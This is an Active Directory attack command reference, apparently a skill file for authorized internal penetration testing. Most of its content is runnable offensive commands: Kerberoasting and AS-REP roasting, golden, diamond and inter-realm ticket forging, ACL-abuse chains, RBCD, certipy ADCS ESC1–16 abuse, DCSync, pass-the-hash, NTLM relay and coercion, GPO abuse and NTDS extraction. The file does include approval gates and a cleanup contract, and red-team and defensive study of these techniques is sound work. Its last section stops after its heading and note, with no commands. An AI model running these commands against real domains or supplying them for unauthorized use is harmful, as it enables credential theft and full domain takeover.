# Active Directory command reference (shared by the AD variants)
# Internal / assumed-breach. AUTHORIZED foothold REQUIRED. Exploitation is APPROVAL-GATED.
# Golden rules: crack OFFLINE · demonstrate the VECTOR/capability (not full domain takeover) · single
# test account for DCSync · no golden-ticket persistence · clean up created objects · no prod-disruptive
# coercion. Placeholders: <d>=domain <u>/<p>=creds <dc>=DC ip/host <ca>=CA <t>=target <h>=NT hash.
═══════════════════════════════════════════════════════════════════════════
## ad-context — enumeration feeder
═══════════════════════════════════════════════════════════════════════════
```
# BloodHound collection
bloodhound-python -d <d> -u <u> -p <p> -c All -ns <dc> --zip
SharpHound.exe --CollectionMethods All --Domain <d> --ExcludeDCs
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bh --autosplit --threshold 900   # stealth via ADWS
# NetExec sweep
nxc smb <dc> --users --groups --pass-pol --shares        nxc smb <range> --rid-brute 10000
nxc smb <range> -u '' -p ''    (null)     nxc smb <range> -u 'a' -p ''   (anon)
nxc ldap <dc> -u <u> -p <p> -M get-desc-users            # descriptions (find MSOL / passwords in desc)
# PowerView / AD module
Get-DomainUser -SPN ; Get-DomainUser -AdminCount ; Get-DomainGroup "*admin*"
Get-ADUser -Filter * -Properties * ; Get-ADGroupMember "Domain Admins" ; Get-ADComputer -Filter *
# ldeep full dump + subcommands (trusts/templates/gmsa/laps/pso/sccm)
ldeep ldap -u <u> -p <p> -d <d> -s ldap://<dc> all <outdir>
# Anonymous / pre-cred
rpcclient -U "" <dc> -N -c 'enumdomusers;getdompwinfo'   ;   enum4linux-ng -A <dc> -oA out
ldapsearch -x -H ldap://<dc> -b "dc=..,dc=.." "(objectClass=person)"
kerbrute userenum -d <d> --dc <dc> users.txt            # valid users, no lockout
# Find the DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.<d>   ;   nmap -p 88 --open <range>
# Roastable users in BloodHound (excl gMSA/MSA/krbtgt):
#   MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true AND NOT u.objectid ENDS WITH '-502'
#     AND NOT COALESCE(u.gmsa,false)=true AND NOT COALESCE(u.msa,false)=true RETURN u
```

═══════════════════════════════════════════════════════════════════════════
## ad-kerberos — roast / delegation / tickets  (crack OFFLINE; capability-only)
═══════════════════════════════════════════════════════════════════════════
```
# AS-REP roast (no creds needed for the roast itself)
GetNPUsers.py <d>/ -dc-ip <dc> -usersfile users.txt -format hashcat -no-pass -outputfile asrep.txt
nxc ldap <dc> -u users.txt -p '' --asreproast asrep.txt     Rubeus.exe asreproast /format:hashcat
# Kerberoast
GetUserSPNs.py -request -dc-ip <dc> <d>/<u>:<p>             Rubeus.exe kerberoast
#   blind/no-preauth Kerberoast (needs an AS-REP-roastable user, no creds):
Rubeus.exe kerberoast /nopreauth:<asrep_user> /spns:users.txt /domain:<d> /dc:<dc>
GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile users.txt -dc-host <dc> <d>/
# TimeRoasting (no creds — computer-account hashes via NTP MS extension)
timeroast.py <dc> -o roast.log        # $sntp-ms$ -> hashcat -m 31300
# Delegation
findDelegation.py "<d>"/"<u>":"<p>"
#   constrained S4U (impersonate a test admin to a test service):
getST.py -spn cifs/<t> -hashes ':<h>' '<d>/<constrained>$' -impersonate Administrator -dc-ip <dc>
Rubeus.exe s4u /ticket:<t> /impersonateuser:Administrator /msdsspn:<spn> /altservice:<alt> /ptt
#   unconstrained (capture a TGT — demonstrate, don't hoard):
mimikatz "privilege::debug" "sekurlsa::tickets /export"   ;   Rubeus.exe monitor /interval:5
# Tickets (CAPABILITY ONLY — forge for a TEST principal, do not persist)
ticketer.py -aesKey <krbtgt_aes> -domain-sid <sid> -domain <d> <testuser>          # golden
ticketer.py -request -impersonate <u> -domain <d> -user <u> -password <p> -nthash <h> \
            -aesKey <k> -domain-sid <sid> 'ignored'                                  # Sapphire (blends in)
ticketer.py -nthash <machine_nt> -domain-sid <sid> -domain <d> <testuser>           # silver
# Crack modes: TGS-RC4 13100 · TGS-AES128 19600 · TGS-AES256 19700 · AS-REP 18200 · MsCache2 2100 · TimeRoast 31300
```

═══════════════════════════════════════════════════════════════════════════
## ad-acl-abuse — exercise ONE edge on a test principal, then REVERT
═══════════════════════════════════════════════════════════════════════════
```
net group "<group>" <myuser> /add /domain                               # AddMember
# Shadow Credentials (msDS-KeyCredentialLink) -> PKINIT -> NT hash
certipy shadow auto -u '<u>@<d>' -p <p> -account '<target>'
pywhisker.py -d <d> -u <u> -p <p> --target <TARGET_SAM> --action add    # (list/remove to clean up)
targetedKerberoast.py -d <d> -u <u> -p <p>                              # GenericWrite -> set SPN -> roast
# RBCD (needs only GenericWrite/GenericAll on the computer — NO DA):
addcomputer.py -computer-name 'ATTACKSYS$' -computer-pass 'Pwned123!' -dc-host <dc> -domain-netbios <NB> '<d>/<u>:<p>'
rbcd.py -dc-ip <dc> -delegate-from 'ATTACKSYS$' -delegate-to '<victim>$' -action write '<d>/<u>:<p>'
getST.py -spn cifs/<victim> -impersonate Administrator '<d>/ATTACKSYS$:Pwned123!'
# DCSync — SINGLE test account only (not the whole domain)
secretsdump.py -just-dc-user '<d>\<testadmin>' <d>/<u>:<p>@<dc>
# Relay -> LDAP ACL escalation
ntlmrelayx.py -t ldaps://<dc> --remove-mic -smb2support --escalate-user <u>
ntlmrelayx.py -t ldaps://<dc> --shadow-credentials --shadow-target '<dc>$'      # or --delegate-access
# Read secrets you're entitled to
Find-AdmPwdExtendedRights -Identity <OU> ; nxc ldap <dc> -u <u> -p <p> --module laps   # LAPS
gMSADumper.py -u <u> -p <p> -d <d>  ;  nxc ldap <dc> -u <u> -p <p> --gmsa              # gMSA
```

═══════════════════════════════════════════════════════════════════════════
## ad-adcs — ESC1-15 (issue a cert as a test principal, then REVOKE)
═══════════════════════════════════════════════════════════════════════════
```
certipy find -u <u>@<d> -p <p> -dc-ip <dc>                               # enumerate templates + ESC flags
# ESC1 (SAN):   certipy req -u <u>@<d> -p <p> -target <ca_srv> -template '<tpl>' -ca <ca> -upn Administrator@<d>
# ESC2/3:       enrollment-agent template -> certipy req ... -on-behalf-of '<d>\<user>' -pfx <cert>
# ESC4:         certipy template -u.. -template <t> -save-old  (write template -> ESC1 -> restore -configuration <t>.json)
# ESC6:         EDITF_ATTRIBUTESUBJECTALTNAME2 set -> behaves like ESC1
# ESC7:         certipy ca -ca <ca> -add-officer '<u>' ; -enable-template '<esc1tpl>' ; -issue-request <id> ; req -retrieve <id>
# ESC8:         ntlmrelayx.py -t http://<dc>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# ESC9/10:      certipy shadow auto -username A@d -p passA -account B ; account update -user B -upn Administrator ; req as B ; reset UPN
# ESC11:        ntlmrelayx.py -t rpc://<ca> -smb2support -rpc-mode ICPR -icpr-ca-name <ca>   (no web enroll)
# ESC13/15:     certipy req ... --application-policies 'Client Authentication' | 'Certificate Request Agent'
# Certifried CVE-2022-26923:  certipy account create -user certipc -pass <p> -dns <dc_fqdn> ; req -template Machine ; auth -> DCSync
# Pass-the-Certificate:  certipy auth -pfx <pfx> -dc-ip <dc>   (pfx -> NT hash) ; gettgtpkinit.py / Rubeus asktgt /certificate:
# masky -d <d> -u <u> -p <p> -ca <ca> <ip>        # cert-based cred dump (NT/ccache/pfx)
# certsync -u <u> -p <p> -d <d> -dc-ip <dc> -ns <ns>    # dump NTDS with NO DA via ADCS
# Golden Certificate (CA key theft -> forge):  certipy ca -backup -ca '<ca>' ... ; certipy forge -ca-pfx <ca_key> -upn <u>@<d>
```

═══════════════════════════════════════════════════════════════════════════
## ad-lateral-movement — authenticate to ANOTHER in-scope host (benign cmd), then clean up
═══════════════════════════════════════════════════════════════════════════
```
nxc smb <t> -u <u> -p <p> -d <d>                 # look for (Pwn3d!) = local admin
# Remote-exec matrix (pick by noise):
#   wmiexec.py  = DCOM Win32_Process.Create (no service, no disk)
#   smbexec.py  = service cmd.exe /c          (Event 7045, no binary on disk)
#   atexec.py   = scheduled task              (Event 4698)
#   psexec.py   = ADMIN$ service, SYSTEM shell (Event 7045/4697)
#   dcomexec.py = MMC20/ShellWindows
nxc smb <t> -u <u> -p <p> -x 'whoami'            # or -X '<ps>'
# Pass-the-Hash
nxc smb <range> -u Administrator -H <h> --local-auth       psexec.py -hashes :<h> Administrator@<t>
evil-winrm -i <t> -u Administrator -H <h>
mimikatz "token::revert" "sekurlsa::pth /user:<u> /domain:<d> /ntlm:<h> /run:cmd"   # token::revert FIRST
# Pass/Overpass-the-Ticket / Pass-the-Key
export KRB5CCNAME=/path.ccache ; <impacket> -k -no-pass       Rubeus.exe ptt /ticket:<t>
getTGT.py <d>/<u> -hashes :<h>                   Rubeus.exe asktgt /user:<u> /domain:<d> /aes256:<k>
# runas credential injection (stealthy); hostname path = Kerberos, IP path = forced NTLM
runas.exe /netonly /user:<d>\<u> cmd.exe
xfreerdp /v:<t> /u:<d>\<u> /pth:<h>              # PtH over RDP
# NTLM relay + coercion (approval; non-disruptive)
nxc smb <range> --gen-relay-list unsigned.txt
ntlmrelayx.py -tf unsigned.txt -smb2support -socks
printerbug.py <d>/<u>:<p>@<printer> <listener>  ;  petitpotam.py -d <d> -u <u> -p <p> <listener> <t>
coercer.py -d <d> -u <u> -p <p> -t <t> -l <ip>
```

## Cleanup contract (every AD run)
Record in `cleanup.md` and REVERT: added group members, shadow-cred key links (`pywhisker --action remove`),
created computer accounts (ATTACKSYS$), RBCD writes (`rbcd.py -action flush`), issued certs (revoke via CA),
tickets/ccaches, enabled templates/officers (ESC7 — disable/remove). No golden-ticket persistence; no
whole-domain NTDS dump; single test account for DCSync.

---

## Extended arsenal — Kerberos   (crack OFFLINE · tickets CAPABILITY-ONLY · no persistence)
Note: the existing **Cleanup contract** (end of file) governs everything below — revert/destroy every object
and ticket you create, redact any recovered NT/key to a fingerprint, single test account for any DCSync.
```
# UnPAC-the-hash — recover an account's NT from a cert/PKINIT (password never seen); offline-equivalent
gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pw> <d>/<testuser> out.ccache        # cert -> TGT (+ AS-REP key)
KRB5CCNAME=out.ccache getnthash.py -key <AS-REP-key> <d>/<testuser>             # TGT -> NT (redact to fp)
certipy auth -pfx <pfx> -dc-ip <dc>                                             # one-shot equivalent (NT + ccache)
#   use: proves a cert == password-equivalent for ONE test principal; cross-ref ADCS ESC / shadow-cred.

# RC4 encryption-downgrade roast — force an RC4 TGS even when the acct supports AES (etype downgrade)
Rubeus.exe kerberoast /tgtdeleg /spn:<spn>           # /tgtdeleg -> RC4 (13100) ticket -> cracks far faster
Rubeus.exe kerberoast /rc4opsec                       # inverse: only roast RC4-supporting accts (no downgrade)
#   note: downgrade shows as Event 4769 ticket-enc 0x17 while the acct holds AES keys — louder, catalogue it.

# Bronze Bit — CVE-2020-17049 (feasibility/awareness; patched Nov-2020) — forge "forwardable" inside S4U
getST.py -spn cifs/<t> -impersonate <protected_user> -force-forwardable -hashes ':<h>' '<d>/<svc>$' -dc-ip <dc>
#   lets a constrained-deleg acct impersonate "not-delegatable"/Protected-Users principals. APPROVAL-GATED.

# Diamond vs Golden (CAPABILITY-ONLY — test principal; demo then PURGE, never persist)
#   golden  = forge a TGT from scratch with the krbtgt key (ticketer, base ref)  -> anomalous PAC, easier to flag
#   diamond = decrypt a REAL TGT with krbtgt AES, edit its PAC, re-encrypt         -> blends with a legit logon
Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt_aes256> /ticketuser:<testuser> /ticketuserid:<rid> /groups:512 /ptt
#   silver/sapphire already covered; after the diamond demo -> klist purge / kdestroy immediately.

# Cross-realm / trust traversal (CAPABILITY-ONLY, APPROVAL-GATED — do NOT operate a prod child->parent hop)
lookupsid.py '<d>/<u>:<p>'@<dc>                                  # harvest SIDs incl. Enterprise Admins (-519)
ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child> \
            -extra-sid <parent_sid>-519 -spn krbtgt/<parent> <testuser>   # forge inter-realm referral TGT
#   feasibility only: proves a SID-filtering gap across the trust; forge for a TEST SID, never traverse with it.

# ccache <-> kirbi conversion (base ref already has the KRB5CCNAME + '-k -no-pass' consume flow)
ticketConverter.py ticket.kirbi ticket.ccache          ticketConverter.py ticket.ccache ticket.kirbi
nxc smb <t> -k --use-kcache            Rubeus.exe ptt /ticket:ticket.kirbi      # consume on Linux / Windows

# SPN-less / computed-SPN roasting nuance
#   Kerberoast REQUIRES a target SPN. Acct with none -> (a) GenericWrite: set a temp SPN, roast, REMOVE it
#   (targetedKerberoast, see ACL section); or (b) skip it: computer/gMSA implicit host/* SPNs use 128-char
#   random keys and are crack-resistant -> catalogue, don't burn compute. Prioritise USER SPNs.

# FAST / Kerberos Armoring awareness (defensive context — no action)
#   if the DC enforces FAST/armoring, the AS-REQ is tunnelled -> AS-REP roast + pre-auth downgrade are blocked.
#   Record it in review.md as a POSITIVE control; do not attempt to strip or downgrade it.

# MachineAccountQuota (MAQ) -> feeds RBCD / shadow-cred / computer-based abuse
nxc ldap <dc> -u <u> -p <p> -M maq                              # read ms-DS-MachineAccountQuota (default 10)
Get-DomainObject -Identity '<d>' -Properties ms-DS-MachineAccountQuota
#   MAQ>0 => any domain user may add ATTACKSYS$ (addcomputer.py, ACL section) -> RBCD without admin rights.
```

---

## Extended arsenal — ACL abuse   (exercise ONE edge on a TEST principal, then REVERT)
Note: the existing **Cleanup contract** applies — every owner/DACL/attribute/membership change below is REVERTED
(record originals first); any DCSync = single test account; recovered secrets redacted to fingerprints.
```
# Edge -> primitive decision table (pick the quietest reversible primitive)
#   WriteOwner        -> take ownership -> WriteDacl -> grant rights -> reset/shadow   (full chain below)
#   WriteDacl         -> grant self GenericAll/ForceChangePassword/DCSync, act, then dacledit -remove
#   GenericAll(user)  -> ForceChangePassword  OR  shadow-cred (no pw reset = quieter + reversible)
#   GenericAll(comp)  -> shadow-cred (recover NT, no reboot)  OR  RBCD (needs MAQ / an owned computer)
#   GenericWrite      -> targetedKerberoast (temp SPN)  OR  shadow-cred  OR  msDS-AllowedToDelegateTo write
#   Self (on group)   -> add SELF as member (AddSelf)
#   WriteDacl/Owns on domain head -> DCSync grant (SINGLE test acct only)
#   Decision GA-on-computer: prefer SHADOW-CRED (instant NT, no RBCD object, no reboot); use RBCD only if
#   PKINIT/ADCS is unavailable — and clean the msDS-AllowedToActOnBehalfOfOtherIdentity write afterwards.

# WriteOwner -> WriteDacl -> grant-rights -> reset  (exact chain, impacket)
owneredit.py -action write -new-owner '<u>' -target '<victim>' '<d>/<u>:<p>' -dc-ip <dc>     # 1 take ownership
dacledit.py  -action write -rights FullControl -principal '<u>' -target '<victim>' '<d>/<u>:<p>' -dc-ip <dc>  # 2 WriteDacl->GA
net rpc password '<victim>' '<Newpw!>' -U '<d>/<u>%<p>' -S <dc>                              # 3 ForceChangePassword
#   REVERT: dacledit -action remove (same ACE) ; owneredit back to the ORIGINAL owner (recorded in step 0).

# Same chain, single modern tool (bloodyAD)
bloodyAD -d <d> -u <u> -p <p> --host <dc> set owner <victim> <u>
bloodyAD -d <d> -u <u> -p <p> --host <dc> add genericAll <victim> <u>
bloodyAD -d <d> -u <u> -p <p> --host <dc> set password <victim> '<Newpw!>'                   # ForceChangePassword
bloodyAD ... remove genericAll <victim> <u>  ;  ... set owner <victim> <ORIG_OWNER>          # REVERT both

# ForceChangePassword — three equivalent flows (capture old value if a login must be restored)
net rpc password <victim> <new> -U '<d>/<u>%<p>' -S <dc>
bloodyAD -d <d> -u <u> -p <p> --host <dc> set password <victim> <new>
changepasswd.py '<d>/<victim>'@<dc> -newpass <new> -altuser '<u>' -altpass '<p>' -reset       # SAMR force-reset

# AddSelf — you hold Self / Write-Member on a group (add self, then remove)
bloodyAD -d <d> -u <u> -p <p> --host <dc> add groupMember '<group>' '<u>'   ;   ... remove groupMember ...  # REVERT
net rpc group addmem '<group>' '<u>' -U '<d>/<u>%<p>' -S <dc>               ;   ... delmem ...              # REVERT

# msDS-AllowedToDelegateTo write = grant yourself CONSTRAINED delegation (GenericWrite on a principal)
bloodyAD -d <d> -u <u> -p <p> --host <dc> set object '<owned>$' msDS-AllowedToDelegateTo -v 'cifs/<t>'
#   then S4U:  getST.py -spn cifs/<t> -impersonate <testadmin> '<d>/<owned>$':<pw> -dc-ip <dc>
#   REVERT: clear the attribute (bloodyAD remove object ... msDS-AllowedToDelegateTo) + drop userAccountControl T2A4D bit.

# scriptPath / profilePath write — benign MARKER only (APPROVAL-GATED, revert)
bloodyAD -d <d> -u <u> -p <p> --host <dc> set object '<victim>' scriptPath -v 'rs_marker.cmd'
#   place a NO-OP rs_marker.cmd (echo-only) in NETLOGON to prove logon-script execution, then BLANK the attr +
#   delete the file. Never a payload; never left in place.

# GPO-edit abuse via write on a linked GPO — benign MARKER (APPROVAL-GATED, auto-revert)
pygpoabuse.py <d>/<u>:<p> -gpo-id <GUID> --command "cmd /c echo rs_marker> C:\\windows\\temp\\rs.txt" --taskname rs_t
SharpGPOAbuse.exe --AddComputerTask --TaskName rs_t --Author <u> --Command cmd.exe --Arguments "/c echo marker" --GPOName "<gpo>"
#   proves GPO write -> code on every linked host. REMOVE the task + restore gPCMachineExtensionNames/versionNumber. Echo ONLY.

# dMSA "BadSuccessor" + SID-history — AWARENESS / FEASIBILITY ONLY (enumerate, do not operate)
#   dMSA: a writable msDS-ManagedAccountPrecededByLink on a delegated-MSA can inherit a target's keys -> privesc;
#         flag the writable dMSA in review.md, do NOT migrate/activate it.
bloodyAD -d <d> -u <u> -p <p> --host <dc> get search --filter '(sidHistory=*)' --attr sAMAccountName,sidHistory
#   sidHistory holding a privileged SID = standing backdoor -> ENUMERATE + report; writing it (DCShadow/-extra-sid)
#   is catalogue-NOT-fire.
```

---

## Extended arsenal — ADCS (ESC extended)   (issue as a TEST principal, then REVOKE)
Note: the existing **Cleanup contract** applies — revoke every issued cert, restore any template / registry /
mapping change, redact any recovered key or NT to a fingerprint. High-impact ESC paths are APPROVAL-GATED.
```
# Read-only CA / template enumeration (no issuance)
certipy find -u <u>@<d> -p <p> -dc-ip <dc> -stdout -vulnerable -hide-admins      # only the ESC-flagged templates
certipy find -u <u>@<d> -p <p> -dc-ip <dc> -enabled -json -output rs_adcs        # full inventory to file
certutil -config "<ca_srv>\<ca>" -ping   ;   certutil -template   ;   certutil -catemplates   # native, read-only
#   LDAP: enrollment services = CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,<dn>

# ESC1 — SAN identity type matters: UPN (user) vs dNSHostName (machine/DC)
certipy req -u <u>@<d> -p <p> -ca <ca> -template <tpl> -upn administrator@<d>    # impersonate a USER  (UPN SAN)
certipy req -u <u>@<d> -p <p> -ca <ca> -template <tpl> -dns <dc_fqdn>            # impersonate a MACHINE (dNSHostName)
certipy req ... -upn administrator@<d> -sid <target_sid>                         # add SID for post-2022 strong binding
#   auth back: UPN cert -> certipy auth (user NT) ; DNS cert -> PKINIT as <dc>$ -> cross-ref UnPAC-the-hash.

# ESC3 — Enrollment Agent full chain (template with the Certificate-Request-Agent EKU)
certipy req -u <u>@<d> -p <p> -ca <ca> -template 'Enrollment Agent'                            # 1 get agent pfx (ea.pfx)
certipy req -u <u>@<d> -p <p> -ca <ca> -template User -on-behalf-of '<d>\administrator' -pfx ea.pfx  # 2 on-behalf-of
certipy auth -pfx administrator.pfx -dc-ip <dc>                                                # 3 auth as impersonated user
#   REVOKE both the agent cert and the OBO cert (ESC7 -revoke / CA console).

# ESC9 (no security extension) / ESC10 (weak mapping) — sharper steps
#   ESC9 = template lacks szOID_NTDS_CA_SECURITY_EXT (no SID baked in) -> a spoofed UPN survives strong binding
certipy shadow auto -u <u>@<d> -p <p> -account <victim>                          # recover <victim> NT (shadow-cred)
certipy account update -u <u>@<d> -p <p> -user <victim> -upn administrator@<d>   # set victim UPN = target
certipy req -u <victim>@<d> -hashes <victim_nt> -ca <ca> -template <esc9tpl>     # cert now maps to administrator
certipy account update -u <u>@<d> -p <p> -user <victim> -upn <victim>@<d>        # REVERT the UPN
#   ESC10 = DC registry weak map: CertificateMappingMethods=0x4 (UPN) OR StrongCertificateBindingEnforcement=0
#     -> same UPN-swap trick, no template precondition. Enumerate the reg value, report, then same UPN revert.

# ESC11 — IF_ENFORCEENCRYPTICERTREQUEST not set on CA RPC (ICPR relay one-liner is in the base ref)
certipy find -u <u>@<d> -p <p> -dc-ip <dc> -stdout | grep -i 'Enforce Encryption for Requests'  # confirm precondition
#   pair with non-disruptive coercion from the lateral-movement ref; APPROVAL-GATED.

# ESC13 — issuance policy linked to an AD group (msDS-OIDToGroupLink)
certipy find -u <u>@<d> -p <p> -dc-ip <dc> -stdout | grep -i ESC13               # template whose policy OID -> a group
certipy req -u <u>@<d> -p <p> -ca <ca> -template <esc13tpl>                      # TGT carries the GROUP SID (no member add)
certipy auth -pfx <u>.pfx -dc-ip <dc>                                            # token shows the linked group -> revoke to remove

# ESC14 — write access to altSecurityIdentities (explicit cert mapping) — AWARENESS
bloodyAD -d <d> -u <u> -p <p> --host <dc> set object <victim> altSecurityIdentities -v 'X509:<I>...<S>...'
#   if you can write altSecurityIdentities on <victim>, map YOUR test cert's issuer+serial -> auth as victim.
#   Feasibility/awareness: enumerate who holds that write; if exercised, CLEAR the attribute to REVERT.

# ESC15 / EKUwu — CVE-2024-49019: schema-version-1 templates accept attacker Application Policies from the CSR
certipy req -u <u>@<d> -p <p> -ca <ca> -template <v1tpl> -application-policies 'Client Authentication'
certipy req ... -application-policies 'Certificate Request Agent' -upn administrator@<d>   # -> ESC3-style on-behalf-of
#   injects a Client-Auth EKU into a v1 template that never intended it -> PKINIT; REVOKE the issued cert.

# PKINIT -> NT cross-ref: any pfx above -> UnPAC-the-hash (see Extended arsenal — Kerberos) for the NT fingerprint.
```

---

## Extended arsenal — Lateral movement   (reach ONE more in-scope host, benign cmd, then clean up)
Note: the existing **Cleanup contract** applies — single recovered/test credential, benign proof command only,
remove every artifact (tickets, temp files, test tasks, tunnels). No golden-ticket persistence.
```
# WinRM / PSRemoting exec channels 5985/5986 (base ref already has evil-winrm -H; add the rest)
nxc winrm <t> -u <u> -p <p> -x 'whoami /all'                                     # -H <h> or -k also work
# from Windows: $s=New-PSSession <t> -Credential $c ; Invoke-Command -Session $s -ScriptBlock {hostname}
# SSH-on-Windows (OpenSSH server present): ssh '<d>\<u>'@<t> 'whoami'            # GSSAPI/-k where Kerberos is allowed

# Additional DCOM exec objects (pick a non-default to dodge MMC20-only detections)
dcomexec.py -object ShellWindows <d>/<u>:<p>@<t> 'whoami'
dcomexec.py -object ShellBrowserWindow <d>/<u>:<p>@<t> 'whoami'
#   others: Excel.Application/ExcelDDE, Outlook, Visio — enumerate app presence (RO) before invoking.

# Read-only WMI / CIM recon (no exec — map before you touch)
nxc wmi <t> -u <u> -p <p> -q "SELECT * FROM Win32_LoggedOnUser"                  # who is logged on
Get-CimInstance -ComputerName <t> -ClassName Win32_Service -Filter "StartName LIKE '%@%'"   # svc accts w/ SPNs
wmic /node:<t> /user:'<d>\<u>' process list brief                               # legacy, read-only process list

# Ticket renewal / forwarding (base has getTGT/asktgt/ptt; add lifetime mgmt) — PURGE after the proof
Rubeus.exe renew /ticket:<t.kirbi> /ptt            kinit -R                      # renew within renew-till window
Rubeus.exe asktgt /user:<u> /aes256:<k> /opsec /forwardable                     # forwardable TGT for S4U chains
klist purge    /    kdestroy                                                     # PURGE every ticket once proven

# RDP cred-injection nuance (base ref has xfreerdp /pth + runas hostname=Krb/IP=NTLM) — add the preconditions
#   PtH over RDP REQUIRES target RestrictedAdmin mode (DisableRestrictedAdmin=0); otherwise /pth is refused.
cmdkey /add:<t_FQDN> /user:'<d>\<u>' /pass:<p>  ;  mstsc /v:<t_FQDN>             # FQDN -> Kerberos SSO ; raw IP -> NTLM

# SOCKS pivot through a relay / proxy (reach segmented hosts)
ntlmrelayx.py -tf targets.txt -smb2support -socks                               # opens SOCKS; type 'socks' to list sessions
proxychains4 nxc smb <internal> -u <u> -p <p>        proxychains4 secretsdump.py <d>/<u>@<internal>
#   (ligolo-ng / chisel = alternative pivots) — keep every tunnel scoped and tear it down in cleanup.

# SCCM / Kerberos-relay cross-reference (not repeated here)
#   SCCM site + client-push / credential abuse -> see the sccm-exploitation skill.
#   Kerberos relay (krbrelayx) where NTLM is blocked -> APPROVAL-GATED; cross-ref the coercion lines above.

# Shadow-copy / VSS NTDS extraction — CATALOGUED, NOT FIRED (disk + prod impact; explicit approval + DCSync-first)
#   vssadmin create shadow /for=C:  ->  copy NTDS.dit + SYSTEM      (OR  ntdsutil "ac i ntds" "ifm" "create full <p>")
#   nxc smb <dc> -u <u> -p <p> -M ntdsutil                          # single-command variant
#   DO NOT run against production DCs; prefer single-account DCSync (base ref). Catalogue the vector only.
```

---

## Extended arsenal — ADCS ESC1–ESC16 quick-reference   (issue as a TEST principal, PKINIT, then REVOKE)
Note: the **Cleanup contract** governs every row — revoke each issued cert, restore any template / registry /
mapping / attribute change, redact recovered keys/NT to fingerprints. Post-2022 strong mapping + Full-Enforcement
KDCs neutralise several rows (6/9/10/16) unless the DC is unpatched/compat — CONFIRM, don't assume. Exact certipy
invocations for ESC1/3/4/6/7/8/9/10/11/13/14/15 are in the blocks above; this is the consolidated decision matrix.
```
# certipy find -u <u>@<d> -p <p> -dc-ip <dc> -vulnerable -stdout     # flags most ESC rows below
```
| ESC | Condition (what `certipy find` flags) | Abuse (1-line) | Benign proof |
|---|---|---|---|
| ESC1 | enrollee-supplies-subject + client-auth EKU + low-priv enroll | request SAN = target UPN/SID | cert → PKINIT as test UPN → revoke |
| ESC2 | Any-Purpose / no EKU | cert usable for any purpose / sub-CA-style signing | issue one test cert → revoke |
| ESC3 | Certificate-Request-Agent EKU template | enrol-on-behalf-of another principal | agent pfx → OBO test cert → revoke both |
| ESC4 | write / FullControl over a template ACL | rewrite template → ESC1 → restore | temp edit → issue → restore template + revoke |
| ESC5 | low-priv control of a PKI object (CA computer obj, NTAuth, PKS/enrollment container) | own the object → own the PKI | enumerate the ACL + report (do NOT rewrite NTAuth) |
| ESC6 | CA has EDITF_ATTRIBUTESUBJECTALTNAME2 | any template accepts a user SAN → ESC1 | test SAN cert → PKINIT → revoke (needs weak map post-2022) |
| ESC7 | ManageCA / ManageCertificates on the CA | flip EDITF, approve/issue denied reqs, SetExtension | add-officer → issue one test req → revoke + drop officer |
| ESC8 | HTTP/CES/CEP/NDES web-enroll + machine+client-auth template | relay coerced NTLM → cert for the relayed host | lab relay → issue DC/machine cert → revoke |
| ESC9 | template CT_FLAG_NO_SECURITY_EXTENSION + GenericWrite on target | UPN-swap → cert maps to admin → revert UPN | shadow-cred NT → swap → cert → auth → restore UPN + revoke |
| ESC10 | DC weak map (StrongCertBinding=0 / CertMappingMethods 0x4) | UPN-swap, no template precondition | read reg value → report; swap + revert if exercised |
| ESC11 | CA RPC (ICPR) not enforcing encryption | relay coerced NTLM → cert via RPC (no web) | confirm flag → lab relay → revoke |
| ESC12 | CA key on YubiHSM2 + HSM pw cleartext in HKLM\SOFTWARE\Yubico\YubiHSM | shell on CA → reuse HSM key → sign any cert | read-only: confirm HSM + reg key exist → report (do NOT sign) |
| ESC13 | template issuance-policy OID linked to a group (msDS-OIDToGroupLink) | enrol → token carries the group SID | issue test cert → show group in token → revoke |
| ESC14 | weak / writable altSecurityIdentities explicit mapping | map cert issuer+serial → auth as victim | if write held: map test cert → auth → CLEAR attr |
| ESC15 | unpatched CA + v1 enrollee-subject template (CVE-2024-49019) | inject Client-Auth / Req-Agent app-policy in CSR | issue test cert w/ injected EKU → PKINIT → revoke |
| ESC16 | CA globally omits szOID_NTDS_CA_SECURITY_EXT (SID ext) | domain-wide UPN-swap (CA-wide ESC9) | confirm CA disabled-ext list → report; swap+revert on compat-KDC only |

---

## Extended arsenal — Delegation primitives   (demonstrate the VECTOR on a TEST target, purge tickets)
Note: Cleanup contract applies — purge every ccache/ticket, clear any attribute set, drop any computer account
created. S4U (getST / Rubeus s4u), RBCD (addcomputer + rbcd.py), the unconstrained TGT-export (mimikatz /
Rubeus monitor) and the coercion triggers all have exact lines above/below — this adds SELECTION LOGIC + one net-new primitive.
```
# Pick the primitive by the account's UAC + attributes (inventory with findDelegation.py, base ref):
#   TRUSTED_FOR_DELEGATION (UAC 0x80000)        -> UNCONSTRAINED : captures any TGT that authenticates to the host
#   msDS-AllowedToDelegateTo populated          -> CONSTRAINED   : S4U2proxy to the listed SPN(s)
#     + TRUSTED_TO_AUTH_FOR_DELEGATION (T2A4D)  ->   protocol transition: S4U2self from a password (no user TGT)
#     - without T2A4D (Kerberos-only)           ->   need an existing forwardable ticket to the account first
#   msDS-AllowedToActOnBehalfOfOtherIdentity    -> RBCD          : always does S4U2self+proxy, no T2A4D (ACL section)

# UNCONSTRAINED on a host you control -> coerce a DC, lift its forwarded TGT (CAPABILITY-ONLY)
#   Windows side = Rubeus.exe monitor (base ref); Linux capture primitive:
krbrelayx.py -aesKey <unconstrained_host_aes>     # decrypt the inbound AP-REQ, save the embedded DC$ TGT
#   trigger with any coercion method (next section) -> hold <dc>$ TGT -> prove capability (klist) -> PURGE.
#   NEVER DCSync / operate a prod DC with the captured TGT — demonstrate the vector only. APPROVAL-GATED.

# CONSTRAINED nuance — S4U2proxy returns a ticket to the requested SPN, but the SERVICE CLASS isn't validated:
#   a cifs/<t> ticket (base s4u line) is reusable as host/http/ldap/... on the SAME <t> via /altservice.
#   target in Protected Users / NOT_DELEGATED -> needs Bronze Bit -force-forwardable (Kerberos arsenal). APPROVAL-GATED.
```

---

## Extended arsenal — Coercion & NTLM/Kerberos relay chains   (non-disruptive; APPROVAL-GATED)
Note: Cleanup contract applies — stop every listener/relay, tear down SOCKS, remove any object a relay created.
